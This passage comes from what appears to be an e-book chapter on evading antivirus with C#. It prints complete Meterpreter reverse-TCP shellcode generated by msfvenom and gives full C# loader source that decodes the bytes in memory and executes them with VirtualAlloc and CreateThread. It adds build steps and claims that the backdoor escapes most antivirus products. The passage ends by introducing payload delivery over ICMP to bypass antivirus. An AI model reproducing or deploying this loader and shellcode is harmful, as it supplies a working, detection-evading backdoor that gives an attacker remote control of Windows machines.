c1,41,ba,ea,0f,df,e0,ff,d5,48,89,c7,6a,10,41,58,4c,89,e2,48,89,f9,41,ba,99,a5,74,61,ff,d5,85,c0,74,0a,49,ff,ce,75,e5,e8,93,00,00,00,48,83,ec,10,48,89,e2,4d,31,c9,6a,04,41,58,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7e,55,48,83,c4,20,5e,89,f6,6a,40,41,59,68,00,10,00,00,41,58,48,89,f2,48,31,c9,41,ba,58,a4,53,e5,ff,d5,48,89,c3,49,89,c7,4d,31,c9,49,89,f0,48,89,da,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7d,28,58,41,57,59,68,00,40,00,00,41,58,6a,00,5a,41,ba,0b,2f,0f,30,ff,d5,57,59,41,ba,75,6e,4d,61,ff,d5,49,ff,ce,e9,3c,ff,ff,ff,48,01,c3,48,29,c6,48,85,f6,75,b4,41,ff,e7,58,6a,00,59,49,c7,c2,f0,b5,a2,56,ff,d5\";\n\r\n\r      //      string[] Xpayload = payload.Split(\',\');\n\r\n\r       //     byte[] X_Final = new byte[Xpayload.Length];\n\r\n\r       //     for (int i = 0; i &lt; Xpayload.Length; i++)\n\r\n\r        //    {\n\r\n\r          //      X_Final[i] = Convert.ToByte(Xpayload[i], 16);\n\r\n\r         //   }    \n\r\n\r      \n\r\n\r byte[] X_Final = new byte[] { 0xfc ,0x48 ,0x83 ,0xe4 ,0xf0 ,0xe8 ,0xcc ,0x00 ,0x00 ,0x00 ,0x41 ,0x51 ,0x41 ,0x50 ,0x52 ,0x51 ,0x56 ,0x48 ,0x31 ,0xd2 ,0x65 ,0x48 ,0x8b ,0x52 ,0x60 ,0x48 ,0x8b ,0x52 ,0x18 ,0x48 ,0x8b ,0x52 ,0x20 ,0x48 ,0x8b ,0x72 ,0x50 ,0x48 ,0x0f ,0xb7 ,0x4a ,0x4a ,0x4d ,0x31 ,0xc9 ,0x48 ,0x31 ,0xc0 ,0xac ,0x3c ,0x61 ,0x7c ,0x02 ,0x2c ,0x20 ,0x41 ,0xc1 ,0xc9 ,0x0d ,0x41 ,0x01 ,0xc1 ,0xe2 ,0xed ,0x52 ,0x41 ,0x51 ,0x48 ,0x8b ,0x52 ,0x20 ,0x8b ,0x42 ,0x3c ,0x48 ,0x01 ,0xd0 ,0x66 ,0x81 ,0x78 ,0x18 ,0x0b ,0x02 ,0x0f ,0x85 ,0x72 ,0x00 ,0x00 ,0x00 ,0x8b ,0x80 ,0x88 ,0x00 ,0x00 ,0x00 ,0x48 ,0x85 ,0xc0 ,0x74 ,0x67 ,0x48 ,0x01 ,0xd0 ,0x50 ,0x8b ,0x48 ,0x18 ,0x44 ,0x8b ,0x40 ,0x20 ,0x49 ,0x01 ,0xd0 ,0xe3 ,0x56 ,0x48 ,0xff ,0xc9 ,0x41 ,0x8b ,0x34 ,0x88 ,0x48 ,0x01 ,0xd6 ,0x4d ,0x31 ,0xc9 ,0x48 ,0x31 ,0xc0 ,0xac ,0x41 ,0xc1 ,0xc9 ,0x0d ,0x41 ,0x01 ,0xc1 ,0x38 ,0xe0 ,0x75 ,0xf1 ,0x4c ,0x03 ,0x4c ,0x24 ,0x08 ,0x45 ,0x39 ,0xd1 ,0x75 ,0xd8 ,0x58 ,0x44 ,0x8b ,0x40 ,0x24 ,0x49 ,0x01 ,0xd0 ,0x66 ,0x41 ,0x8b ,0x0c ,0x48 ,0x44 ,0x8b ,0x40 ,0x1c ,0x49 ,0x01 ,0xd0 ,0x41 ,0x8b ,0x04 ,0x88 ,0x48 ,0x01 ,0xd0 ,0x41 ,0x58 ,0x41 ,0x58 ,0x5e ,0x59 ,0x5a ,0x41 ,0x58 ,0x41 ,0x59 ,0x41 ,0x5a ,0x48 ,0x83 ,0xec ,0x20 ,0x41 ,0x52 ,0xff ,0xe0 ,0x58 ,0x41 ,0x59 ,0x5a ,0x48 ,0x8b ,0x12 ,0xe9 ,0x4b ,0xff ,0xff ,0xff ,0x5d ,0x49 ,0xbe ,0x77 ,0x73 ,0x32 ,0x5f ,0x33 ,0x32 ,0x00 ,0x00 ,0x41 ,0x56 ,0x49 ,0x89 ,0xe6 ,0x48 ,0x81 ,0xec ,0xa0 ,0x01 ,0x00 ,0x00 ,0x49 ,0x89 ,0xe5 ,0x49 ,0xbc ,0x02 ,0x00 ,0x11 ,0x5c ,0xc0 ,0xa8 ,0x25 ,0x81 ,0x41 ,0x54 ,0x49 ,0x89 ,0xe4 ,0x4c ,0x89 ,0xf1 ,0x41 ,0xba ,0x4c ,0x77 ,0x26 ,0x07 ,0xff ,0xd5 ,0x4c ,0x89 ,0xea ,0x68 ,0x01 ,0x01 ,0x00 ,0x00 ,0x59 ,0x41 ,0xba ,0x29 ,0x80 ,0x6b ,0x00 ,0xff ,0xd5 ,0x6a ,0x05 ,0x41 ,0x5e ,0x50 ,0x50 ,0x4d ,0x31 ,0xc9 ,0x4d ,0x31 ,0xc0 ,0x48 ,0xff ,0xc0 ,0x48 ,0x89 ,0xc2 ,0x48 ,0xff ,0xc0 ,0x48 ,0x89 ,0xc1 ,0x41 ,0xba ,0xea ,0x0f ,0xdf ,0xe0 ,0xff ,0xd5 ,0x48 ,0x89 ,0xc7 ,0x6a ,0x10 ,0x41 ,0x58 ,0x4c ,0x89 ,0xe2 ,0x48 ,0x89 ,0xf9 ,0x41 ,0xba ,0x99 ,0xa5 ,0x74 ,0x61 ,0xff ,0xd5 ,0x85 ,0xc0 ,0x74 ,0x0a ,0x49 ,0xff ,0xce ,0x75 ,0xe5 ,0xe8 ,0x93 ,0x00 ,0x00 ,0x00 ,0x48 ,0x83 ,0xec ,0x10 ,0x48 ,0x89 ,0xe2 ,0x4d ,0x31 ,0xc9 ,0x6a ,0x04 ,0x41 ,0x58 ,0x48 ,0x89 ,0xf9 ,0x41 ,0xba ,0x02 ,0xd9 ,0xc8 ,0x5f ,0xff ,0xd5 ,0x83 ,0xf8 ,0x00 ,0x7e ,0x55 ,0x48 ,0x83 ,0xc4 ,0x20 ,0x5e ,0x89 ,0xf6 ,0x6a ,0x40 ,0x41 ,0x59 ,0x68 ,0x00 ,0x10 ,0x00 ,0x00 ,0x41 ,0x58 ,0x48 ,0x89 ,0xf2 ,0x48 ,0x31 ,0xc9 ,0x41 ,0xba ,0x58 ,0xa4 ,0x53 ,0xe5 ,0xff ,0xd5 ,0x48 ,0x89 ,0xc3 ,0x49 ,0x89 ,0xc7 ,0x4d ,0x31 ,0xc9 ,0x49 ,0x89 ,0xf0 ,0x48 ,0x89 ,0xda ,0x48 ,0x89 ,0xf9 ,0x41 ,0xba ,0x02 ,0xd9 ,0xc8 ,0x5f ,0xff ,0xd5 ,0x83 ,0xf8 ,0x00 ,0x7d ,0x28 ,0x58 ,0x41 ,0x57 ,0x59 ,0x68 ,0x00 ,0x40 ,0x00 ,0x00 ,0x41 ,0x58 ,0x6a ,0x00 ,0x5a ,0x41 ,0xba ,0x0b ,0x2f ,0x0f ,0x30 ,0xff ,0xd5 ,0x57 ,0x59 ,0x41 ,0xba ,0x75 ,0x6e ,0x4d ,0x61 ,0xff ,0xd5 ,0x49 ,0xff ,0xce ,0xe9 ,0x3c ,0xff ,0xff ,0xff ,0x48 ,0x01 ,0xc3 ,0x48 ,0x29 ,0xc6 ,0x48 ,0x85 ,0xf6 ,0x75 ,0xb4 ,0x41 ,0xff ,0xe7 ,0x58 ,0x6a ,0x00 ,0x59 ,0x49 ,0xc7 ,0xc2 ,0xf0 ,0xb5 ,0xa2 ,0x56 ,0xff ,0xd5};\n\r\n\r\n\r\n\rin “Picture 1” you can compare result for two Codes (string and bytes) :\n\r\n\ras you can see by string method your Meterpreter Payload Transformed From “FC , 48”  to “66 63 , 34 38” in your EXE file.\n\r\n\rBut with byte Method your Meterpreter Payloads without change Hard-coded to your EXE file so this File will detect Probably by most of AVS very fast .\n\r\n\r Picture 1: \n\r\n\rnow we should talk about Section “STEP1” in our “Source Code 1”\n\r\n\r \n\r\n\r1.  string payload = \"fc,48,83,e4,f0,...,a2,56,ff,d5\";\n\r\n\r2.  string[] Xpayload = payload.Split(\',\');\n\r\n\r3.            byte[] X_Final = new byte[Xpayload.Length];\n\r\n\r4.            for (int i = 0; i &lt; Xpayload.Length; i++)\n\r\n\r5.            {\n\r\n\r6.                X_Final[i] = Convert.ToByte(Xpayload[i], 16);\n\r\n\r7.            }          \n\r\n\r \n\r\n\rimportant point for this trick is all Meterpreter Bytes will make in Memory without Saving in File-system so for Proof of Concept you can See this Thing in “Picture 1” by “NativePayload_HardcodedPayload_string.exe” C# Code. As you can see in “Picture 1” Meterpreter Bytes “FC 48” in this Method Saved in File-system by these Bytes as STRING :\n\r\n\r66  ==&gt; F\n\r\n\r63 ==&gt;  C\n\r\n\r2C  ==&gt; ,\n\r\n\r34 ==&gt; 4 \n\r\n\r38 ==&gt;  8\n\r\n\r \n\r\n\rFC48 Meterpreter Bytes\n\r\n\r660063002C00340038002C Meterpreter Transformed to Strings Bytes\n\r\n\r \n\r\n\rso we have something like this FC48 transformed to 660063002C00340038002C\n\r\n\r \n\r\n\rwith Code string[] Xpayload = payload.Split(\',\'); you will Remove these Bytes from 660063002C00340038002C \n\r\n\rso you will have these bytes in string[] Xpayload  , it means in Memory.\n\r\n\r \n\r\n\r660063002C00340038002C == &gt;  660063002C00340038002C\n\r\n\r\n\r\n\rstring[] Xpayload == 66633438\n\r\n\rXpayload[0]= 66\n\r\n\rXpayload[1]= 63\n\r\n\rXpayload[2]= 34\n\r\n\rXpayload[3]= 38\n\r\n\r \n\r\n\rImportant Point : With this Variable  byte[] X_Final you will have FC48 Meterpreter bytes In Memory after Converting from 66633438 to FC48  by Codes (Line Numbers 4 and 6).\n\r\n\r \n\r\n\rafter these Code we will have Meterpreter Payload in Memory by  byte[] X_Final Variable now We need some Codes for Execute these Meterpreter Bytes in Memory by Create one New Thread into Current Process.\n\r\n\r \n\r\n\rnow we should talk about Section “STEP 2” in “Source_Code_1”.\n\r\n\r \n\r\n\r  /// STEP 2: Begin\n\r\n\r0.            UInt32 MEM_COMMIT = 0x1000;\n\r\n\r1.            UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r2.            Console.WriteLine();\n\r\n\r3.            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r4.            Console.WriteLine(\"Bingo Meterpreter session by Hardcoded Payload with strings ;)\");\n\r\n\r5.            UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)X_Final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r6.            Marshal.Copy(X_Final, 0x0000, (IntPtr)(funcAddr), X_Final.Length);\n\r\n\r7.            IntPtr hThread = IntPtr.Zero;\n\r\n\r8.            UInt32 threadId = 0x0000;\n\r\n\r9.            IntPtr pinfo = IntPtr.Zero;\n\r\n\r \n\r\n\r10.            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);\n\r\n\r11.            WaitForSingleObject(hThread, 0xffffffff);\n\r\n\r            /// STEP 2: End\n\r\n\r12.        }\n\r\n\r13.        [DllImport(\"kernel32\")]\n\r\n\r14.        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\r\n\r15.        [DllImport(\"kernel32\")]\n\r\n\r16.        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\r\n\r17.        [DllImport(\"kernel32\")]\n\r\n\r18.        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\r\n\r19.     }\n\r\n\r20. }\n\r\n\r \n\r\n\ras you can see in Section “STEP2” we have some code for API Programming and [DllImport(\"kernel32\")].\n\r\n\rIf you want to use some Windows API Function (Unmanaged Codes) in your C# Codes (Managed Codes) then you need these lines like (line Numbers : 13 , 14 , 15 , 16, 17, 18). with these line I want to use these API Function (  VirtualAlloc ,  CreateThread ,  WaitForSingleObject ).\n\r\n\r \n\r\n\rNote : Don\'t Worry this is API Programming but I will try to Explain these Codes very simple and Useful also let me tell you my Friends I am not Professional API Programmer by C# so If I can Do this , you can do this too.\n\r\n\r \n\r\n\rIf I want to explain these codes from Line 0 up to 20 Shortly : with this code you will Allocate memory Space in current Process for your Meterpreter Payload then your code will Copy Payload DATA from Managed Codes AREA  ( byte[] X_Final ) to Unmanaged Codes AREA ( UInt32 funcAddr) by ( Marshal.Copy ) finally your code Will make New Thread by ( CreateThread ) in your Current Process also Executing that and waiting for Response from your New thread by (   WaitForSingleObject(hThread, 0xffffffff) ).\n\r\n\r \n\r\n\rSTEP 2 :\n\r\n\r \n\r\n\r  /// STEP 2: Begin\n\r\n\r0.            UInt32 MEM_COMMIT = 0x1000;\n\r\n\r1.            UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r2.            Console.WriteLine();\n\r\n\r3.            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r4.            Console.WriteLine(\"Bingo Meterpreter session by Hardcoded Payload with strings ;)\");\n\r\n\r5.            UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)X_Final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r6.            Marshal.Copy(X_Final, 0x0000, (IntPtr)(funcAddr), X_Final.Length);\n\r\n\r \n\r\n\rby These codes in Line Number 0 and 1 you will set Type of memory allocation in this case we need 1000 and 40 by type UInt32.\n\r\n\rcode in line number 5 : commits Virtual Address Space for current process by length (UInt32)X_Final.Length also with start address 0 .\n\r\n\rCode in Line Number 6 with this code ( Marshal.Copy ) your DATA  in your Meterpreter Payload Variable in this case ( X_Final ) will copy to Unmanaged Code AREA (funcAddr) it means your meterpreter payload From .NET code will Copy to Unmanaged Code to Executing by new Threads.\n\r\n\r \n\r\n\r7.            IntPtr hThread = IntPtr.Zero;\n\r\n\r8.            UInt32 threadId = 0x0000;\n\r\n\r9.            IntPtr pinfo = IntPtr.Zero;\n\r\n\r10.            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);\n\r\n\r11.            WaitForSingleObject(hThread, 0xffffffff);\n\r\n\r            /// STEP 2: End\n\r\n\r \n\r\n\rfinally by ( CreateThread ) you will make one New Thread into Current Process with Meterpreter Payload by Pointer for Executing Functions in your Meterpreter PAYLOAD and with (WaitForSingleObject) you will waiting for Executing Result from New Thread .\n\r\n\r \n\r\n\rImportant point : This Highlighted Section of our Source Code will Detect by Kaspersky Anti Viruses probably if you uses this Source code in Text format by TXT extension :\n\r\n\r \n\r\n\r            UInt32 MEM_COMMIT = 0x1000;\n\r\n\r            UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine(\"Bingo Meterpreter session by Hardcoded Payload with strings ;)\");\n\r\n\r            UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)X_Final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r            Marshal.Copy(X_Final, 0x0000, (IntPtr)(funcAddr), X_Final.Length);\n\r\n\r            IntPtr hThread = IntPtr.Zero;\n\r\n\r            UInt32 threadId = 0x0000;\n\r\n\r            IntPtr pinfo = IntPtr.Zero;\n\r\n\r             hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);\n\r\n\r             WaitForSingleObject(hThread, 0xffffffff);\n\r\n\r            /// \n\r\n\r \n\r\n\rso if you want to test this code Right Now maybe This Source Code with Text Format Will Detect by Kaspersky AV for example Kaspersky Will Detect this Source Code with TXT format It means Copy and Paste these Lines from 7 up to 11 to text Files for example Demo.txt file then if you want to Download this File by HTTP traffic with Text File TXT extension then Will Detect by KASPERSKY  AV ver:17 or you can test that with right-click and selecting Scan by AV. Interesting they want to Catch your Codes in Text format so in this case Kaspersky want to Find Red Codes and they don not care about Your Meterpreter Payload if you want to use that by String Tricks or Bytes Method in your Executable Files “EXE” But this Backdoor Source Code and Executable File will not Detect by Most AVS right now (2016-2017). \n\r\n\r \n\r\n\r \n\r\n\rCreating C#.NET Code and Testing.\n\r\n\r \n\r\n\rNow for Testing This Source Code we should make C# Console Application Project Step by Step :\n\r\n\r \n\r\n\rTo create and run a console application\n\r\n\r\n\r1.Start Visual Studio 2008 or 2015 on Windows 2008 / 7 / 8.1 / 2012 \n\r\n\r\n\r2.On the menu bar, choose File, New, Project.  \n\r\n\r\n\rThe New Project dialog box opens. \n\r\n\r\n\r3.Expand Installed, expand Templates, expand Visual C#, and then choose Console Application.  \n\r\n\r\n\r4.In the Name box, specify name “NativePayload_HardcodedPayload\" for your project ,  also select .NET Frameworks 2.0 or 3.5 or 4.0 only and then choose the OK button.  \n\r\n\r\n\rThe new project appears in Solution Explorer.  \n\r\n\r\n\r5.If Program.cs isn\'t open in the Code Editor, open the shortcut menu for Program.cs in Solution Explorer, and then choose View Code.  \n\r\n\r\n\r6.Replace the contents of Program.cs with the following code but in your code ( string payload = ) variable data is depend on your Msfvenom output in your LAB  then you should Make listener for your Backdoor By Metaspolit in your Kali Linux Please back to Page 2 of this Chapter and See how can Make Backdoor Payloads by Msfvenom tool by “Transform Format 1-1” table for your C# Code  for more information please Watch Videos 1-1 (Chapter 1 , Test-1) , now you can Run (Compile/Execute) your C# Code by Pressing F5. \n\r\n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\rusing System.Text;\n\r\n\r \n\r\n\rnamespace NativePayload_HardcodedPayload\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r            /// STEP 1: Begin\n\r\n\r            /// msfvenom --platform windows --arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.37.129 -f c &gt; payload.txt\n\r\n\r            string payload = \"fc,48,83,e4,f0,e8,cc,00,00,00,41,51,41,50,52,51,56,48,31,d2,65,48,8b,52,60,48,8b,52,18,48,8b,52,20,48,8b,72,50,48,0f,b7,4a,4a,4d,31,c9,48,31,c0,ac,3c,61,7c,02,2c,20,41,c1,c9,0d,41,01,c1,e2,ed,52,41,51,48,8b,52,20,8b,42,3c,48,01,d0,66,81,78,18,0b,02,0f,85,72,00,00,00,8b,80,88,00,00,00,48,85,c0,74,67,48,01,d0,50,8b,48,18,44,8b,40,20,49,01,d0,e3,56,48,ff,c9,41,8b,34,88,48,01,d6,4d,31,c9,48,31,c0,ac,41,c1,c9,0d,41,01,c1,38,e0,75,f1,4c,03,4c,24,08,45,39,d1,75,d8,58,44,8b,40,24,49,01,d0,66,41,8b,0c,48,44,8b,40,1c,49,01,d0,41,8b,04,88,48,01,d0,41,58,41,58,5e,59,5a,41,58,41,59,41,5a,48,83,ec,20,41,52,ff,e0,58,41,59,5a,48,8b,12,e9,4b,ff,ff,ff,5d,49,be,77,73,32,5f,33,32,00,00,41,56,49,89,e6,48,81,ec,a0,01,00,00,49,89,e5,49,bc,02,00,11,5c,c0,a8,25,81,41,54,49,89,e4,4c,89,f1,41,ba,4c,77,26,07,ff,d5,4c,89,ea,68,01,01,00,00,59,41,ba,29,80,6b,00,ff,d5,6a,05,41,5e,50,50,4d,31,c9,4d,31,c0,48,ff,c0,48,89,c2,48,ff,c0,48,89,c1,41,ba,ea,0f,df,e0,ff,d5,48,89,c7,6a,10,41,58,4c,89,e2,48,89,f9,41,ba,99,a5,74,61,ff,d5,85,c0,74,0a,49,ff,ce,75,e5,e8,93,00,00,00,48,83,ec,10,48,89,e2,4d,31,c9,6a,04,41,58,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7e,55,48,83,c4,20,5e,89,f6,6a,40,41,59,68,00,10,00,00,41,58,48,89,f2,48,31,c9,41,ba,58,a4,53,e5,ff,d5,48,89,c3,49,89,c7,4d,31,c9,49,89,f0,48,89,da,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7d,28,58,41,57,59,68,00,40,00,00,41,58,6a,00,5a,41,ba,0b,2f,0f,30,ff,d5,57,59,41,ba,75,6e,4d,61,ff,d5,49,ff,ce,e9,3c,ff,ff,ff,48,01,c3,48,29,c6,48,85,f6,75,b4,41,ff,e7,58,6a,00,59,49,c7,c2,f0,b5,a2,56,ff,d5\";\n\r\n\r            string[] Xpayload = payload.Split(\',\');\n\r\n\r            byte[] X_Final = new byte[Xpayload.Length];\n\r\n\r            for (int i = 0; i &lt; Xpayload.Length; i++)\n\r\n\r            {\n\r\n\r                X_Final[i] = Convert.ToByte(Xpayload[i], 16);\n\r\n\r            }          \n\r\n\r \n\r\n\r// byte[] X_Final = new byte[] { 0xfc ,0x48 ,0x83 ,0xe4 ,0xf0 ,0xe8 ,0xcc ,0x00 ,0x00 ,0x00 ,0x41 ,0x51 ,0x41 ,0x50 ,0x52 ,0x51 ,0x56 ,0x48 ,0x31 ,0xd2 ,0x65 ,0x48 ,0x8b ,0x52 ,0x60 ,0x48 ,0x8b ,0x52 ,0x18 ,0x48 ,0x8b ,0x52 ,0x20 ,0x48 ,0x8b ,0x72 ,0x50 ,0x48 ,0x0f ,0xb7 ,0x4a ,0x4a ,0x4d ,0x31 ,0xc9 ,0x48 ,0x31 ,0xc0 ,0xac ,0x3c ,0x61 ,0x7c ,0x02 ,0x2c ,0x20 ,0x41 ,0xc1 ,0xc9 ,0x0d ,0x41 ,0x01 ,0xc1 ,0xe2 ,0xed ,0x52 ,0x41 ,0x51 ,0x48 ,0x8b ,0x52 ,0x20 ,0x8b ,0x42 ,0x3c ,0x48 ,0x01 ,0xd0 ,0x66 ,0x81 ,0x78 ,0x18 ,0x0b ,0x02 ,0x0f ,0x85 ,0x72 ,0x00 ,0x00 ,0x00 ,0x8b ,0x80 ,0x88 ,0x00 ,0x00 ,0x00 ,0x48 ,0x85 ,0xc0 ,0x74 ,0x67 ,0x48 ,0x01 ,0xd0 ,0x50 ,0x8b ,0x48 ,0x18 ,0x44 ,0x8b ,0x40 ,0x20 ,0x49 ,0x01 ,0xd0 ,0xe3 ,0x56 ,0x48 ,0xff ,0xc9 ,0x41 ,0x8b ,0x34 ,0x88 ,0x48 ,0x01 ,0xd6 ,0x4d ,0x31 ,0xc9 ,0x48 ,0x31 ,0xc0 ,0xac ,0x41 ,0xc1 ,0xc9 ,0x0d ,0x41 ,0x01 ,0xc1 ,0x38 ,0xe0 ,0x75 ,0xf1 ,0x4c ,0x03 ,0x4c ,0x24 ,0x08 ,0x45 ,0x39 ,0xd1 ,0x75 ,0xd8 ,0x58 ,0x44 ,0x8b ,0x40 ,0x24 ,0x49 ,0x01 ,0xd0 ,0x66 ,0x41 ,0x8b ,0x0c ,0x48 ,0x44 ,0x8b ,0x40 ,0x1c ,0x49 ,0x01 ,0xd0 ,0x41 ,0x8b ,0x04 ,0x88 ,0x48 ,0x01 ,0xd0 ,0x41 ,0x58 ,0x41 ,0x58 ,0x5e ,0x59 ,0x5a ,0x41 ,0x58 ,0x41 ,0x59 ,0x41 ,0x5a ,0x48 ,0x83 ,0xec ,0x20 ,0x41 ,0x52 ,0xff ,0xe0 ,0x58 ,0x41 ,0x59 ,0x5a ,0x48 ,0x8b ,0x12 ,0xe9 ,0x4b ,0xff ,0xff ,0xff ,0x5d ,0x49 ,0xbe ,0x77 ,0x73 ,0x32 ,0x5f ,0x33 ,0x32 ,0x00 ,0x00 ,0x41 ,0x56 ,0x49 ,0x89 ,0xe6 ,0x48 ,0x81 ,0xec ,0xa0 ,0x01 ,0x00 ,0x00 ,0x49 ,0x89 ,0xe5 ,0x49 ,0xbc ,0x02 ,0x00 ,0x11 ,0x5c ,0xc0 ,0xa8 ,0x25 ,0x81 ,0x41 ,0x54 ,0x49 ,0x89 ,0xe4 ,0x4c ,0x89 ,0xf1 ,0x41 ,0xba ,0x4c ,0x77 ,0x26 ,0x07 ,0xff ,0xd5 ,0x4c ,0x89 ,0xea ,0x68 ,0x01 ,0x01 ,0x00 ,0x00 ,0x59 ,0x41 ,0xba ,0x29 ,0x80 ,0x6b ,0x00 ,0xff ,0xd5 ,0x6a ,0x05 ,0x41 ,0x5e ,0x50 ,0x50 ,0x4d ,0x31 ,0xc9 ,0x4d ,0x31 ,0xc0 ,0x48 ,0xff ,0xc0 ,0x48 ,0x89 ,0xc2 ,0x48 ,0xff ,0xc0 ,0x48 ,0x89 ,0xc1 ,0x41 ,0xba ,0xea ,0x0f ,0xdf ,0xe0 ,0xff ,0xd5 ,0x48 ,0x89 ,0xc7 ,0x6a ,0x10 ,0x41 ,0x58 ,0x4c ,0x89 ,0xe2 ,0x48 ,0x89 ,0xf9 ,0x41 ,0xba ,0x99 ,0xa5 ,0x74 ,0x61 ,0xff ,0xd5 ,0x85 ,0xc0 ,0x74 ,0x0a ,0x49 ,0xff ,0xce ,0x75 ,0xe5 ,0xe8 ,0x93 ,0x00 ,0x00 ,0x00 ,0x48 ,0x83 ,0xec ,0x10 ,0x48 ,0x89 ,0xe2 ,0x4d ,0x31 ,0xc9 ,0x6a ,0x04 ,0x41 ,0x58 ,0x48 ,0x89 ,0xf9 ,0x41 ,0xba ,0x02 ,0xd9 ,0xc8 ,0x5f ,0xff ,0xd5 ,0x83 ,0xf8 ,0x00 ,0x7e ,0x55 ,0x48 ,0x83 ,0xc4 ,0x20 ,0x5e ,0x89 ,0xf6 ,0x6a ,0x40 ,0x41 ,0x59 ,0x68 ,0x00 ,0x10 ,0x00 ,0x00 ,0x41 ,0x58 ,0x48 ,0x89 ,0xf2 ,0x48 ,0x31 ,0xc9 ,0x41 ,0xba ,0x58 ,0xa4 ,0x53 ,0xe5 ,0xff ,0xd5 ,0x48 ,0x89 ,0xc3 ,0x49 ,0x89 ,0xc7 ,0x4d ,0x31 ,0xc9 ,0x49 ,0x89 ,0xf0 ,0x48 ,0x89 ,0xda ,0x48 ,0x89 ,0xf9 ,0x41 ,0xba ,0x02 ,0xd9 ,0xc8 ,0x5f ,0xff ,0xd5 ,0x83 ,0xf8 ,0x00 ,0x7d ,0x28 ,0x58 ,0x41 ,0x57 ,0x59 ,0x68 ,0x00 ,0x40 ,0x00 ,0x00 ,0x41 ,0x58 ,0x6a ,0x00 ,0x5a ,0x41 ,0xba ,0x0b ,0x2f ,0x0f ,0x30 ,0xff ,0xd5 ,0x57 ,0x59 ,0x41 ,0xba ,0x75 ,0x6e ,0x4d ,0x61 ,0xff ,0xd5 ,0x49 ,0xff ,0xce ,0xe9 ,0x3c ,0xff ,0xff ,0xff ,0x48 ,0x01 ,0xc3 ,0x48 ,0x29 ,0xc6 ,0x48 ,0x85 ,0xf6 ,0x75 ,0xb4 ,0x41 ,0xff ,0xe7 ,0x58 ,0x6a ,0x00 ,0x59 ,0x49 ,0xc7 ,0xc2 ,0xf0 ,0xb5 ,0xa2 ,0x56 ,0xff ,0xd5 };\n\r\n\r            \n\r\n\r            /// STEP 1: End\n\r\n\r            \n\r\n\r            /// STEP 2: Begin\n\r\n\r            UInt32 MEM_COMMIT = 0x1000;\n\r\n\r            UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine(\"Bingo Meterpreter session by Hardcoded Payload with strings ;)\");\n\r\n\r            UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)X_Final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r            Marshal.Copy(X_Final, 0x0000, (IntPtr)(funcAddr), X_Final.Length);\n\r\n\r            IntPtr hThread = IntPtr.Zero;\n\r\n\r            UInt32 threadId = 0x0000;\n\r\n\r            IntPtr pinfo = IntPtr.Zero;\n\r\n\r \n\r\n\r            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);\n\r\n\r            WaitForSingleObject(hThread, 0xffffffff);\n\r\n\r            /// STEP 2: End\n\r\n\r        }\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\r\n\r    }\n\r\n\r}\n\r\n\r\n\r\n\rNow you can Watch one by one Videos.\n\r\n\r \n\r\n\r ","","topics\\Chapter 1.html","\n\r\n\rTransfer/Download Payload via ICMPv4 Traffic by “TTL”\n\r\n\r \n\r\n\rWhy do we need to use these Protocols and Traffic for Transferring/Downloading Payload?\n\r\n\rMy answer is, why not! An important point for these protocols is no one suspects an attacker to use\n\r\n\rgeneral or normal traffic for monitoring especially DNS and ARP also ICMP; therefore, if an attacker\n\r\n\rused these protocols for transferring malware payloads you should know how to do this and think about\n\r\n\rdefense against these threats, too.\n\r\n\rNote: these (DNS , ARP and ICMP techniques) have payload without encryption in network traffic, also\n\r\n\rwe have payload “in Memory” , so with these methods an attacker can bypass your Anti-viruses\n\r\n\rbecause we don\'t have hardcoded payloads with or without encryption in File-System. \n\r\n\rWith this technique, our malware after execute , tried to send ICMP traffic to an attacker’s Linux system by ping and you can dump payloads by Ping Response TTL value from Linux system very simply. Furthermore,\n\r\n\ryou can execute this dumped payload in Windows Memory directly so you will see an attacker can 